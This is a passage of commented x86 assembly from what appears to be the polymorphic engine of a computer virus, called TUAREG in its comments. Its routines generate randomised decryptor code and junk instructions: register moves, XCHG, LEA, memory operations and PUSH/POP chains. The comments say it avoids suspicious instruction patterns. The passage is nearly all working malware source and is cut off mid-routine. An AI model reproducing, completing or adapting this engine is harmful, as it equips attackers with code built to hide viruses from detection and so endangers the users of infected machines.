;; Returns: Nothing (even if there's an error)
ReleaseVar      proc
                push    ecx
                push    edx
                movzx   edx, byte ptr [ebp+GarbageRecursivity]
                shl     edx, 5
                lea     edx, [ebp+edx]
                mov     ecx, 8
     @@Loop01:  cmp     dword ptr [edx+4*ecx+ReservedMemVars_Addr-4], ebx
                jz    @@Found
                loop  @@Loop01
                pop     edx
                pop     ecx
                ret
      @@Found:  sub     edx, ebp
                shr     edx, 2
                add     edx, ebp
                mov     byte ptr [edx+ecx+ReservedMemVars_F-1], 0
                pop     edx
                pop     ecx
                ret
ReleaseVar      endp

;; DL=Register to PUSH
DoPUSHReg       proc
                pushad
                inc     byte ptr [ebp+MOVingRecursLevel]
                cmp     byte ptr [ebp+MOVingRecursLevel], 5
                jae   @@DirectPUSH
                call    RandomFlags
                jz    @@DirectPUSH

                call    GetAndReserveVar
                or      ebx, ebx
                jz    @@DirectPUSH
                call    DoMOVMemReg
                call    DoRandomGarbage
                call    DoPUSHMem
                call    ReleaseVar
                jmp     EndRecursiveMOVing

     @@DirectPUSH:
                mov     al, 50h
                add     al, dl
                stosb
                jmp     EndRecursiveMOVing
DoPUSHReg       endp

DoPOPReg        proc
                pushad
                inc     byte ptr [ebp+MOVingRecursLevel]
                cmp     byte ptr [ebp+MOVingRecursLevel], 5
                jae   @@DirectPOP

                call    GetAndReserveVar
                or      ebx, ebx
                jz    @@DirectPOP
                call    DoPOPMem
                call    DoRandomGarbage
                call    DoMOVRegMem
                call    ReleaseVar
                jmp     EndRecursiveMOVing

   @@DirectPOP: mov     al, 58h
                add     al, dl
                stosb
                jmp     EndRecursiveMOVing
DoPOPReg        endp

;; In: EBX=Memory address
DoPUSHMem       proc
                pushad
                call    RandomFlags
                jz    @@WithIndex
    @@Direct:   mov     ax, 35FFh
    CommonWithDoPUSH2:
    @@Common:   stosw
                mov     eax, ebx
                stosd
                jmp   @@End

   @@WithIndex: cmp     byte ptr [ebp+KeyIsInit], 1
                jnz   @@Direct
                mov     ax, 0B0FFh
   CommonWithDoPUSH:
                or      ah, [ebp+KeyRegister]
                sub     ebx, [ebp+DecryptKey]
                cmp     ebx, 7Fh
                jb    @@ByteAddition
                cmp     ebx, 0FFFFFF80h
                jb    @@Common
    @@ByteAddition:
                and     ax, 3FFFh
                or      ah, 40h
                stosw
                mov     eax, ebx
                stosb

     EndOfDoPUSHMem:
     @@End:     mov     [esp+S_EDI], edi
                popad
                ret
DoPUSHMem       endp

DoPOPMem        proc
                pushad
                call    RandomFlags
                jz    @@WithIndex
    @@Direct:   mov     ax, 058Fh
                jmp     CommonWithDoPUSH2
   @@WithIndex: cmp     byte ptr [ebp+KeyIsInit], 1
                jnz   @@Direct
                mov     ax, 0808Fh
                jmp     CommonWithDoPUSH
DoPOPMem        endp

DoMOVRegMem     proc
                pushad
                inc     byte ptr [ebp+MOVingRecursLevel]
                cmp     byte ptr [ebp+MOVingRecursLevel], 5
                jae   @@NoRecursives

    @@OtherRandom:
                call    Random
                and     al, 3
                jz    @@OtherRandom
                cmp     al, 2
                jb    @@DirectMOV
                jz    @@DirectMOVIndexed
    @@PUSHPOP:  call    DoPUSHMem
                call    DoRandomGarbage
                call    DoPOPReg
                jmp     EndRecursiveMOVing

   @@DirectMOV: mov     ax, 058Bh
   CommonMRMDirectMOV:
                shl     dl, 3
                or      ah, dl
                stosw
                mov     eax, ebx
                stosd
                jmp     EndRecursiveMOVing

   @@DirectMOVIndexed:
                cmp     byte ptr [ebp+KeyIsInit], 1
                jnz   @@DirectMOV
                mov     ax, 808Bh
   CommonMRMDirectMOV2:
                or      ah, [ebp+KeyRegister]
                sub     ebx, [ebp+DecryptKey]
                cmp     ebx, 7Fh
                jbe   @@Cont_01
                cmp     ebx, 0FFFFFF80h
                jb      CommonMRMDirectMOV
     @@Cont_01: and     ah, 07h
                shl     dl, 3
                or      ah, dl
                or      ah, 40h
                stosw
                mov     eax, ebx
                stosb
                jmp     EndRecursiveMOVing

   @@NoRecursives:
                call    RandomFlags
                jz    @@DirectMOV
                jmp   @@DirectMOVIndexed
DoMOVRegMem     endp

DoMOVMemReg     proc
                pushad
                inc     byte ptr [ebp+MOVingRecursLevel]
                cmp     byte ptr [ebp+MOVingRecursLevel], 5
                jae   @@NoRecursives

     @@OtherRandom:
                call    Random
                and     al, 3
                jz    @@OtherRandom
                cmp     al, 2
                jb    @@DirectMOV
                jz    @@DirectMOVIndexed

     @@PUSHPOP: call    DoPUSHReg
                call    DoRandomGarbage
                call    DoPOPMem
                jmp     EndRecursiveMOVing

   @@DirectMOV: mov     ax, 0589h
                jmp     CommonMRMDirectMOV
   @@DirectMOVIndexed:
                cmp     byte ptr [ebp+KeyIsInit], 1
                jnz   @@DirectMOV
                mov     ax, 8089h
                jmp     CommonMRMDirectMOV2

   @@NoRecursives:
                call    RandomFlags
                jz    @@DirectMOV
                jmp   @@DirectMOVIndexed
DoMOVMemReg     endp

;; This constructs a XOR between two registers. As the function DoXOR, it has
;; to be made directly, since there aren't more options to do a XOR. Anyway,
;; we can use two slightly different opcodes to perform that.
;; When we call it: DH=Source register, DL=Destiny register
DoXORRegReg     proc
                pushad
                inc     byte ptr [ebp+MOVingRecursLevel]
                cmp     byte ptr [ebp+MOVingRecursLevel], 5
                jae   @@Direct
                call    RandomFlags
                jz    @@Direct

                call    GetAndReserveVar
                or      ebx, ebx
                jz    @@Direct
                xchg    dh, dl
                call    DoMOVMemReg
                call    DoRandomGarbage
                xchg    dh, dl
                call    DoXORRegMem
                call    ReleaseVar
                jmp   @@End

     @@Direct:  mov     ax, 0C031h  ; Opcode of XOR Reg,Reg
  DoXXXRegReg:  call    RandomFlags ; Random Zero Flag
                jz    @@1           ; Jump and avoid the next instructions
                add     al, 2       ; Convert opcode to 33h so...
                xchg    dh, dl      ;...we must exchange source and destiny
        @@1:    shl     dh, 3
                or      ah, dl
                or      ah, dh  ; Set the registers to the opcode
                stosw           ; Store the opcode

     EndOfRecursiveMOVing:
     @@End:     dec     byte ptr [ebp+MOVingRecursLevel]
                mov     [esp+S_EDI], edi
                popad
                ret
DoXORRegReg     endp

DoADDRegReg     proc
                pushad
                inc     byte ptr [ebp+MOVingRecursLevel]
                cmp     byte ptr [ebp+MOVingRecursLevel], 5
                jae   @@NoRecursives

      @@Other:  call    Random
                and     al, 3
                jz    @@Other
                cmp     al, 2
                jb    @@Direct
                jz    @@LEA

                call    GetAndReserveVar
                or      ebx, ebx
                jz    @@Direct
                xchg    dh, dl
                call    DoMOVMemReg
                call    DoRandomGarbage
                xchg    dh, dl
                call    DoADDRegMem
                call    ReleaseVar
                jmp     EndOfRecursiveMOVing

     @@LEA:     mov     ax, 048Dh
                cmp     dh, dl
                jz    @@Direct
                cmp     dh, 5
                jz    @@LEA_x
                cmp     dl, 5
                jz    @@LEA_y
                call    RandomFlags
                jz    @@LEA_x
     @@LEA_y:   xchg    dh, dl
     @@LEA_x:   stosw
                mov     al, dl
                shl     dh, 3
                or      al, dh
                stosb
                jmp     EndOfRecursiveMOVing

     @@NoRecursives:
                call    RandomFlags
                jz    @@Direct
                jmp   @@LEA

     @@Direct:  mov     ax, 0C001h
                jmp     DoXXXRegReg
DoADDRegReg     endp

DoSUBRegReg     proc
                pushad
                inc     byte ptr [ebp+MOVingRecursLevel]
                cmp     byte ptr [ebp+MOVingRecursLevel], 5
                jae   @@Direct
                call    RandomFlags
                jz    @@Direct
                call    GetAndReserveVar
                or      ebx, ebx
                jz    @@Direct
                xchg    dh, dl
                call    DoMOVMemReg
                call    DoRandomGarbage
                xchg    dh, dl
                call    DoSUBRegMem
                call    ReleaseVar
                jmp     EndOfRecursiveMOVing

     @@Direct:  mov     ax, 0C029h
                jmp     DoXXXRegReg
DoSUBRegReg     endp

;; This set of three functions are called using RandomCalling to call them
;; in a random order, because the order doesn't matter here. This functions
;; set the initial value to Index1, Index2 and Key registers.
SetIndex2Register proc
                mov     eax, [ebp+InitialValue]   ; Get the initial value
                mov     dl, [ebp+Index2Register]  ; Get Index2Register
                call    DoMOV            ; Make a move operation
                call    DoRandomGarbage  ; Make garbage
                ret          ; Return
SetIndex2Register endp

;; Set the Index1 register initial value
SetIndex1Register proc
                mov     dl, [ebp+Index1Register]  ; Get Index1Register
                call    Random            ; Generate a random addition for the
                and     eax, Virus_SizePOW2 - 4  ; PRIDE technique
                call    DoMOV             ; Make a move operation
                call    DoRandomGarbage   ; Make garbage
                ret          ; Return
SetIndex1Register endp

;; Set the Key register value
SetKeyRegister  proc
                mov     dl, [ebp+KeyRegister] ; Get KeyRegister
                mov     eax, [ebp+DecryptKey] ; Get decryption key
                call    DoMOV            ; Make a move operation
                call    DoRandomGarbage  ; Make garbage
                mov     byte ptr [ebp+KeyIsInit], 1
                ret          ; Return
SetKeyRegister  endp

KeyIsInit       db      0

;; Here it is the most used function of this engine. This function calls up to
;; three times to the function Garbage, which generates a single garbage ins-
;; truction (in the case it doesn't select any recursive type).
DoRandomGarbage proc
                push    eax
                call    Random
                and     eax, 3 ; Get a random number between 0 and 3
                call    RandomFlags
                jz    @@Check0
                cmp     eax, 1
                jbe   @@End
                dec     eax
                jmp   @@Loop
     @@Check0:  or      eax, eax
                jz    @@End
    @@Loop:     call    Garbage  ; Call the main function of garbage
                dec     eax
                jnz   @@Loop   ; Repeat EAX times
      @@End:    pop     eax    ; Restore EAX
                ret            ; Return
DoRandomGarbage endp

GarbageRecursivity      db      0 ; This variable is incremented each time
                                  ; we enter in Garbage, and decreased when
                                  ; we exit. With this, we can control the
                                  ; garbage quantity on recursive types, and
                                  ; we can have a closer control when creating
                                  ; subroutines.

;; The main garbage generator. It can generate garbage of many types, and it
;; can be recursively called (some types of garbage are composed of two or
;; more instructions, so DoRandomGarbage is called between).
Garbage         proc
                pushad     ; Save all
                inc     byte ptr [ebp+GarbageRecursivity] ; Increase the num-
                                         ; ber of active instances of Garbage
                cmp     byte ptr [ebp+GarbageRecursivity], 5 ; If we are too
                jz    @@Return            ; high on recursive instances, exit
                call    RandomFlags   ; Do we make garbage?
                jz    @@Make1
                js    @@Make1
                jp    @@DontMake

      @@Make1:  call    Random    ; Get a random type
                and     al, 3
                jz    @@GeneralWithValue ; Let's do a common type with direct
                                         ; value
                cmp     al, 2
                jb    @@GeneralWithReg  ; Common type with a random register
                jz    @@NotEasyOnes     ; Some complex ones
      ;; Some mixed types. We can do XCHG, MOVZX, MOVSX, INC, DEC and PUSH/
      ;; POP pairs
   @@SomeMore:  call    RandomFlags
                jz    @@Make1
                and     ah, 3
                jz    @@XCHG       ; Do XCHG
                cmp     ah, 2
                jb    @@MOVZXSX    ; Do MOVZX or MOVSX
                jz    @@INCDEC     ; Do INC or DEC

       ;; Let's do PUSH Reg/Garbage/POP Reg
  @@PUSHPOP:
   @@PUSHPOP32: cmp     byte ptr [ebp+GarbageRecursivity], 4
                jz    @@Make1  ; If we can't do more garbage (many recursive
                               ; calls), select another type
                call    SelectAnyRegisterWithInit ;Get an initialized register
                add     al, 50h
                stosb            ; PUSH it
                mov     esi, edi ; Save the current storage address (EDI)
   @@PUSHPOP_4: call    DoRandomGarbage ; Make garbage
                cmp     esi, edi        ; Current EDI=Saved EDI?
                jz    @@PUSHPOP_4       ; Then, it means that no garbage were
                                        ; generated, so jump to make again
   @@PUSHPOP_2: call    SelectARegister ; Select a not-reserved register
                add     al, 58h         ; Construct a POP
                stosb                   ; Store the opcode
                jmp   @@Return     ; Return

        ;; Let's make XCHG Reg32,Reg32, XCHG Reg16,Reg16 or XCHG Reg8,Reg8
    @@XCHG:     call    RandomFlags
                jz    @@XCHG32   ; XCHG Reg32,Reg32 with a 75% of probability,
                js    @@XCHG8    ; XCHG Reg8,Reg8 with a 25% of probability
     @@XCHG32:  call    SelectARegisterWithInit ; Get a not-reserved initiali-
                mov     dl, al         ; zed register and save it in DL
     @@XCHG_01: call    SelectARegisterWithInit ; Get another not-reserved
                                       ; initialized register
                cmp     dl, al   ; Is the same register?
                jz    @@XCHG_01  ; Then, select another
                or      al, al   ; EAX?
                jz    @@XCHGWithEAX2 ; Then, use the optimized opcode
                or      dl, dl   ; EAX?
                jz    @@XCHGWithEAX  ; Then use the optimized opcode (1 byte)
                mov     ah, 0C0h
                or      ah, al
                mov     al, 87h
                shl     dl, 3   ; Construct the opcode with the two registers.
                or      ah, dl  ; The opcode is 87 C0+Reg1*8+Reg2
                stosw           ; Store the opcode
                jmp   @@Return  ; Return
      @@XCHGWithEAX2:
                mov     al, dl  ; Set the other register (the one which isn't
                                ; EAX) in AL
      @@XCHGWithEAX:
                add     al, 90h ; Add the mask of the opcode of XCHG Reg,EAX
                stosb           ; Store the opcode
                jmp   @@Return  ; Return
     @@XCHG8:   call    SelectAReg8 ; Get a 8 bits register
                cmp     al, 8       ; Test if we can select anyone (maybe the
                                    ; four reserved registers are casually
                                    ; all the E?X)
                jz    @@Make1   ; If we can't, select another type of garbage
                mov     dl, al  ; Save it in DL
                call    SelectAReg8 ; Get a 8 bits register
                cmp     dl, al  ; Is it the same?
                jz    @@Make1   ; If it's the same, select another type of
                                ; garbage, because maybe only one E?X can be
                                ; selected for garbage
                add     al, 0C0h ; Set the mask of "register usage" in the
                                 ; second opcode
                shl     dl, 3
                add     al, dl  ; Set the other register
                mov     ah, al
                mov     al, 86h ; Put the main opcode (86h) in AL
                stosw           ; Store the 2 bytes opcode
                jmp   @@Return  ; Return

       ;; Here we make MOVZX Reg32,Reg8/Reg16 or MOVSX Reg32,Reg8/Reg16
   @@MOVZXSX:   call    SelectARegister  ; Get a register
                mov     dl, al           ; Save it in DL
    @@MOVZX_01: call    SelectAnyRegisterWithInit ;Get any init. register
                cmp     al, dl     ; Is it the same?
                jz    @@MOVZX_01   ; If it's the same, select another
                shl     dl, 3      ; Set the register number in bits 5-4-3
                push    eax        ; Save the second register
                call    Random     ; Get a random number
                mov     al, 0Fh    ; AL=Extended opcode (0Fh)
                and     ah, 9
                add     ah, 0B6h   ; Get in AH a random B6h, B7h, BEh or BFh
                                   ; 0F B6: MOVZX Reg32,Any8
                                   ; 0F B7: MOVZX Reg32,Any16
                                   ; 0F BE: MOVSX Reg32,Any8
                                   ; 0F BF: MOVSX Reg32,Any16
                stosw            ; Store the opcode
                pop     eax      ; Restore register
                or      al, 0C0h ; Activate "register usage" with the 8 or 16
                                 ; bits register
                or      al, dl   ; Set the destiny register
                stosb            ; Store the third opcode
                jmp   @@Return   ; Return

     ;; Make INC or DEC. This types are only INC Reg32 or INC Reg8
   @@INCDEC:    call    RandomFlags
                jc    @@INC32    ; Make INC Reg32 with a 75% of probability
                js    @@INC8     ; Make INC Reg8 with a 25% of probability
      @@INC32:  call    SelectARegisterWithInit ; Get a not-reserved initiali-
                mov     dl, al             ; zed register and save it in DL
                call    Random
                and     al, 8       ; Get INC if AL=0 or DEC if AL=8
                add     al, 40h     ; Add opcode mask
                add     al, dl      ; Add register mask
                stosb               ; Store the opcode
                jmp   @@Return      ; Return
             ;; 8 bits version
      @@INC8:   call    SelectAReg8 ; Get a 8 bits register
                cmp     al, 8       ; If there aren't selectable 8 bits regis-
                jz    @@Make1       ; ters, select another type of garbage
                mov     dl, al      ; Set the register in DL
                call    Random
                and     ah, 8       ; Get INC or DEC
                add     ah, dl      ; Set the register in the second opcode
                add     ah, 0C0h    ; Mask the second opcode for "register"
                mov     al, 0FEh    ; AL=Main opcode. This opcode has some
                ; weird instructions that generate exceptions, since the other
                ; instructions are only for 32 bits, but you can play with the
                ; DEBUG and generate instructions like CALL AL (FEh D0h) :)
                stosw            ; Store the opcode
                jmp   @@Return   ; Return

 ;; GeneralWithValue begins here. This part generates an instruction from the
 ;; common most used opcodes 80h and 81h. This time we select a not-reserved
 ;; register and then we make ADD, OR, ADC, SBB, AND, SUB, XOR or CMP (well,
 ;; that CMP is substituted by MOV). It's very easy to do.
     @@Make1_:  popf              ; This is to restore flags from stack and
                jmp   @@Make1     ; jump to make another type of garbage
 @@GeneralWithValue:
                call    RandomFlags ; Get a random type
                pushf             ; Save this new flags
                jz    @@GWV_32b
                js    @@GWV_32b   ; Make a 32 bits one (75% of probability)
    @@GWV_8b:   call    SelectAReg8 ; Get a 8 bits register
                cmp     al, 8       ; Can be selected?
                jz    @@Make1_      ; If not, jump (pop flags and select other
                                    ; type of garbage)
                mov     dl, al    ; Save the register in DL
                call    Random
                and     al, 38h   ; Get a random operation
                cmp     al, 38h   ; Were we going to make CMP?
                jnz   @@GWV8_01   ; If not, continue
                mov     al, 0B0h  ; Make a MOV
                add     al, dl    ; Mask the register
                stosb             ; Store the opcode
                jmp   @@GWV_02    ; Jump to insert a random value
    @@GWV8_01:  or      dl, dl    ; Are we going to use AL?
                jz    @@GWV_AL    ; If we use it, use its own opcode
                mov     ah, 80h   ; Opcode 80h (OP Reg8,Value8)
                jmp   @@GWV_03    ; Jump and continue

    @@GWV_32b:  call    SelectARegisterWithInit ; Get an initialized not-re-
                                                ; served 32 bits register
                mov     dl, al    ; DL=Reg32
                call    Random
                and     al, 38h   ; Get a random operation
                cmp     al, 38h
                jnz   @@GWV_01    ; If we were going to use CMP, use MOV
                push    edx
                movzx   edx, dl   ; Check if the register is "touched". If it
                cmp     byte ptr [ebp+edx+TouchedRegisters], 1 ; is, we avoid
                pop     edx       ; moving a value on it (it's very suspicious
                                  ; to have two MOVs one after another, so just
                                  ; in case before there is another MOV, we
                                  ; avoid it).
                jz    @@Make1_    ; If it's "touched", select another type of
                                  ; garbage
                mov     al, 0B8h  ; MOV instead of CMP
                add     al, dl    ; Mask the opcode
                stosb             ; Store the opcode
                jmp   @@GWV_02    ; Jump to store the value
    @@GWV_01:   or      dl, dl    ; EAX?
                jz    @@GWV_EAX   ; Then use its own opcode
                mov     ah, 81h   ; Opcode 81h (OP Reg32,Value32)
    @@GWV_03:   xchg    ah, al    ; Exchange the opcodes in AH and AL
                or      ah, 0C0h  ; Mask the 2nd opcode
                or      ah, dl    ; Set the register to the 2nd opcode
                stosw             ; Store the opcode
                jmp   @@GWV_02    ; Jump to complete the instruction
    @@GWV_EAX:  add     al, 1
    @@GWV_AL:   add     al, 4 ; If the register was AL, we add 4 to the opcode
                              ; in AL to make OP AL,Value8. If the register
                              ; was EAX, we add 5 to the opcode in AL to make
                              ; OP EAX,Value32
                stosb         ; We store the opcode
     @@GWV_02:  call    Random  ; Get a random number in EAX
                popf            ; Restore flags to know wether to use 8 bits
                jz    @@Store32 ; or 32 bits to complete the instruction
                js    @@Store32
     @@Store8:  stosb           ; Store a random byte to complete
                jmp   @@Return  ; Return
     @@Store32: stosd           ; Store a random dword to complete
                jmp   @@Return  ; Return

 ;; This part is similar to GeneralWithValue, but this time we use a random
 ;; register as source of operation, not a value.
 @@GeneralWithReg:
                call    RandomFlags
                jz    @@GWR_32b
                jc    @@GWR_32b  ; Select 32 bits instructions with a 75% of
                                 ; probability
     @@GWR_8b:  call    SelectAReg8 ; Select a 8 bit register
                cmp     al, 8       ; Can we select them?
                jz    @@Make1      ; If not, we select another type of garbage
                mov     dl, al     ; Save it in DL
     @@GWR8_02: call    SelectAReg8 ; Select another Reg8
                mov     dh, al     ; Save it in DH
                cmp     dl, al     ; Are they the same register?
                jnz   @@GWR8_01    ; If not, jump and use a random operation
                call    RandomFlags ; Jump to select another Reg8 with a 50%
                jz    @@GWR8_02     ; of probability
                call    Random
                and     ah, 8      ; Since the registers are equal, we select
                add     ah, 28h    ; a more reliable instruction (XOR or SUB)
                jmp   @@GWR8_04    ; Jump to continue with this opcode
     @@GWR8_01: call    Random
     @@GWR8_04: and     ah, 38h    ; Get a random operation
                cmp     ah, 38h    ; Check if it's CMP
                jnz   @@GWR8_03    ; If it isn't jump
                push    edx
                movzx   edx, dl
                and     dl, 3
                cmp     byte ptr [ebp+edx+TouchedRegisters], 1
                pop     edx        ; Is that register "touched"?
                jz    @@Make1      ; If it is, select other type of garbage
                mov     ah, 88h   ; MOV instead of CMP
     @@GWR8_03: mov     al, ah    ; Put it in AL
                jmp   @@GWR_04    ; Jump to make the instruction

     @@GWR_32b: call    SelectARegisterWithInit ; Select an initialized not-
                mov     dl, al         ; reserved register and save it in DL
    @@GWR32_01: call    SelectAnyRegisterWithInit ; Get any initialized regis-
                cmp     dl, al  ; ter and compare it with the selected before
                jnz   @@GWR_03  ; If it's different, jump
                call    RandomFlags ; If it's equal, repeat the register ob-
                jz    @@GWR32_01    ; tention with a 50% of probability
                mov     dh, al  ; Save the register in DH
                call    Random   ; Select XOR or SUB, which are the most re-
                and     ah, 8    ; liable instructions that can be used with
                add     ah, 28h  ; the same source and operand register
                jmp   @@GWR_05   ; Jump and continue
     @@GWR_03:  mov     dh, al   ; Save the register
                call    Random
     @@GWR_05:  and     ah, 38h  ; Get a random operation
                cmp     ah, 38h  ; CMP?
                jnz   @@GWR_02   ; If not, jump
                push    edx
                movzx   edx, dl
                cmp     byte ptr [ebp+edx+TouchedRegisters], 1
                pop     edx      ; Is the register "touched"?
                jz    @@Make1    ; If it is, avoid MOV (and select another
                                 ; type of garbage)
                mov     ah, 88h   ; MOV instead of CMP
      @@GWR_02: mov     al, ah    ; Put the opcode in AL
                inc     eax       ; Make it "32 bits"
      @@GWR_04: mov     ah, 0C0h  ; 2nd opcode as "register usage"
                call    RandomFlags ; Get alternate?
                jz    @@GWR_01    ; Jump if not
                add     al, 2     ; Add 2 to the opcode...
                xchg    dh, dl    ; ...and exchange source and destiny
      @@GWR_01: shl     dh, 3
                or      ah, dl
                or      ah, dh    ; Set the registers in the 2nd opcode
                stosw             ; Store the opcode
                jmp   @@Return    ; Return

 ;; Here we make various types of "difficult" garbage. In this part of the
 ;; function we construct CALLs, conditional jumps, memory read/writes or
 ;; LEAs with complicated sources.
 @@NotEasyOnes: call    RandomFlags
                jz    @@RecursiveOnes
                js    @@MemoryOperation

   ;; Here we construct a LEA
   @@LEA:       call    SelectARegister ; Get a not-reserved register
                mov     dl, al
                movzx   edx, dl    ; Check if the register is "touched"
                cmp     byte ptr [ebp+edx+TouchedRegisters], 1
                jz    @@Make1      ; If it is, select other type of garbage
      @@LEA_00: call    Random   ; Get a type of LEA
                and     al, 3
                jz    @@LEA_00   ; AL=0: Repeat random getting
                cmp     al, 2
                jb    @@Direct   ; AL=1: LEA Reg,[Direct_Value]
                jz    @@OneReg   ; AL=2: LEA Reg,[Reg+Value]

    ;; Here we make: LEA Reg,[(X*)Reg+Reg+Value]
     @@TwoRegs: mov     ax, 848Dh ; LEA with three opcodes
                shl     dl, 3
                or      ah, dl    ; Set the destiny register
                stosw             ; Store the first two bytes of the opcode
                call    Random    ; Get a random byte
                stosb             ; Store it to get a completely random index
                call    Random    ; Get a random addition
                stosd             ; Store it
                jmp   @@Return    ; Return

     ;; Here we make: LEA Reg,[Reg+Value]
      @@OneReg: call    Random
                and     ah, 7
                cmp     ah, 4
                jz    @@OneReg    ; Random register (not ESP) for source
                add     ah, 80h   ; Set dword addition
      @@LEA_01: shl     dl, 3
                or      ah, dl    ; Set the destiny register
                mov     al, 8Dh   ; Main opcode of LEA
                stosw             ; Store the opcode
                call    Random
                stosd             ; Store a random addition
                jmp   @@Return    ; Return

     ;; Here we make: LEA Reg,[Value]
      @@Direct: mov     ah, 05h   ; Put this special opcode (direct value)
                jmp   @@LEA_01    ; Jump to complete the instruction

@@MemoryRead    db      0   ; This variable signalizes a memory read or a me-
                            ; mory write in the code below
@@Memo32bits    db      0   ; This variable indicates if a 32 bits read/write
                            ; is made, or we are doing a 8 bits one

 ;; Here we make a memory operation. We can make a read or write, and it can
 ;; be indexed, using the Key register, since it's the only one that doesn't
 ;; change its value (at least in this version of the TUAREG).
 ;; We have to be sure that the used memory addresses exist (even reads), due
 ;; to the fact that it's protected mode and the memory addresses are 32 bits,
 ;; not like DOS where we can read from anywhere.
 @@MemoryOperation:
                call    RandomFlags
                setz    al   ; Get a random AX being 0000h, 0001h, 0100h or
                sets    ah   ; 0101h, to set @@MemoryRead and @@Memo32bits
                mov     word ptr [ebp+@@MemoryRead], ax  ; with random 0 or 1
                           ; and use them to construct the garbage instruction
                call    SelectAnAddressLow ; Get a random read/writing address
                                        ; in EBX
                call    RandomFlags ; Randomly, select the type of instruction
                jz    @@MW_WithReg  ; If ZF, make a read/write with a reg

     ;; Make: OP [Memory_Address],Value
     @@MW_WithValue:
                call    Random
                and     ah, 38h    ; Get a random operation
                cmp     ah, 38h    ; CMP?
                jz    @@MW_WV_MOV  ; Then, do MOV
                mov     al, 80h    ; Set main opcode
                jmp   @@MW_Continue01 ; Jump
  @@MW_WV_MOV:  mov     ax, 00C6h     ; C6 = Opcode of MOV
     @@MW_Continue01:
                call    RandomFlags   ; Indexed?
                jz    @@MW_WV_NotIndexed
                js    @@MW_WV_NotIndexed
                jc    @@MW_WV_Indexed
                jp    @@MW_WV_NotIndexed
          ; Select indexed with a (12.5%+6.25%) of probability
   ;; This is the indexed one. We can do OP Reg,[Reg2+Value] (or the reverse)
       @@MW_WV_Indexed:
                cmp     byte ptr [ebp+KeyIsInit], 1
                jnz   @@MW_WV_NotIndexed    ; If it isn't set yet, then make a
                                            ; not indexed operation
                call    RandomFlags
                jz    @@MW_WV_NotThird
                js    @@MW_WV_NotThird
                or      ah, 04h         ; Activate third opcode
                call    RandomFlags
                pushf
                jz    @@MW_WV_Mult_32b
                js    @@MW_WV_Mult_8b
       @@MW_WV_Mult_32b:
                inc     eax
       @@MW_WV_Mult_8b:
                stosw
       @@MW_WV_RepeatMult:
                call    Random
                and     al, 3
                jz    @@MW_WV_RepeatMult
                mov     cl, al
                mov     al, byte ptr [ebp+KeyRegister]
                shl     al, 3
                or      al, 5
                mov     edx, [ebp+DecryptKey]
                shl     edx, cl
                ror     cl, 2
                or      al, cl
                stosb
                sub     ebx, edx
                jmp   @@MW_WVGb
       @@MW_WV_NotThird:
                or      ah, 80h          ; Mask the opcode for dword addition
                or      ah, byte ptr [ebp+KeyRegister] ; Set the key register
                sub     ebx, [ebp+DecryptKey]   ; Subtract the value of the
                                        ; key register to the memory address
                jmp   @@MW_WV_01     ; Jump to complete the instruction
      ;; Here we make not indexed operations
   @@MW_WV_NotIndexed:
                add     ah, 5        ; Direct value inside the brackets
       @@MW_WV_01:
                call    RandomFlags
                pushf
                jz    @@MW_WV32b
                js    @@MW_WV8b      ; Select 8 or 32 bits

    @@MW_WV32b: inc     eax        ; If 32 bits, increase the main opcode
    @@MW_WV8b:  stosw              ; Store the opcode
    @@MW_WVGb:  mov     eax, ebx   ; Complete with the addition or the direct
                stosd              ; memory address
                call    Random     ; Get a random value in EAX
                popf
                jz    @@Store32   ; If 32 bits, complete with a random dword
                js    @@Store8    ; value. If not, complete with only a byte
                jmp   @@Store32

    ;; Here we use a random register instead of a value. This time we can make
    ;; reads or writes (with value we can only do writes). If we write to me-
    ;; mory, we can use any of the seven general purpose registers. If it's
    ;; a read, only a not-reserved one.
    @@MW_WithReg:
                cmp     byte ptr [ebp+@@MemoryRead], 1 ; Read or write?
                jnz   @@MW_WR_80                       ; Jump if write
                cmp     byte ptr [ebp+@@Memo32bits], 1 ; 8 or 32 bits?
                jz    @@MW_WR_79         ; Jump if 32 bits
        ;; Here we make OP Reg8,[(Reg+)Value]
                call    SelectAReg8     ; Select a 8 bits register
                cmp     al, 8           ; Can we select anyone?
                jz    @@MemoryOperation ; If not, select another type of op.
                jmp   @@MW_WR_81        ; Jump and continue
        ;; Here we make OP Reg32,[(Reg+)Value]
    @@MW_WR_79: call    SelectARegister ; Select a not-reserved register
                jmp   @@MW_WR_81        ; Jump and continue
        ;; Here we make OP [(Reg+)Value],Reg8/32
    @@MW_WR_80: call    SelectAnyRegisterWithInit ; Select any register, and
                                ; initialize it to a random value if it isn't
                                ; set with a value
    @@MW_WR_81: mov     dl, al     ; Save the register in DL
                call    Random     ; Get an operation
                and     al, 38h
                call    RandomFlags     ; Select indexed or not
                jz    @@MW_WR_NotIndexed
                js    @@MW_WR_NotIndexed
                jc    @@MW_WR_Indexed
                jp    @@MW_WR_NotIndexed
        ;; Here if we use indexation using the Key register
     @@MW_WR_Indexed:
                cmp     byte ptr [ebp+KeyIsInit], 1 ; If the key register
                jnz   @@MW_WR_NotIndexed    ; isn't set with its value, then
                                            ; we can't do this, so make a not
                                            ; indexed memory operation
                call    RandomFlags
                jz    @@MW_WR_NotThird
                js    @@MW_WR_NotThird
                cmp     al, 38h     ; CMP?
                jnz   @@MW_WR_99    ; If not, jump
                mov     al, 88h     ; If CMP, substitute it by MOV
       @@MW_WR_99:
                mov     ah, 4h
                shl     dl, 3
                or      ah, dl
                mov     cl, byte ptr [ebp+@@Memo32bits]
                add     al, cl
                mov     cl, byte ptr [ebp+@@MemoryRead]
                add     al, cl
                add     al, cl
                stosw
       @@MW_WR_RepeatMult:
                call    Random
                and     eax, 3
                jz    @@MW_WR_RepeatMult
                mov     ecx, eax
                mov     eax, 1
                shl     eax, cl
       @@MW_WR_Subtract:
                sub     ebx, [ebp+DecryptKey]
                dec     eax
                jnz   @@MW_WR_Subtract
                mov     al, [ebp+KeyRegister]
                shl     al, 3
                or      al, 5
                ror     cl, 2
                or      al, cl
                stosb
                jmp   @@MW_WR_02

       @@MW_WR_NotThird:
                mov     ah, 80h     ; Mask with dword addition
                or      ah, byte ptr [ebp+KeyRegister] ; Put the indexation
                                                       ; register in the opc.
                sub     ebx, [ebp+DecryptKey] ; Calculate the addition
                shl     dl, 3
                or      ah, dl      ; Set the destiny register
                cmp     al, 38h     ; CMP?
                jnz   @@MW_WR_01    ; If not, jump
                mov     al, 88h     ; If CMP, substitute it by MOV
                jmp   @@MW_WR_01    ; Jump to continue
     ;; Here to make with no indexation (direct memory address)
   @@MW_WR_NotIndexed:
                mov     ah, 05h     ; Direct value inside brackets
   @@MW_WR_Cont01:
                shl     dl, 3
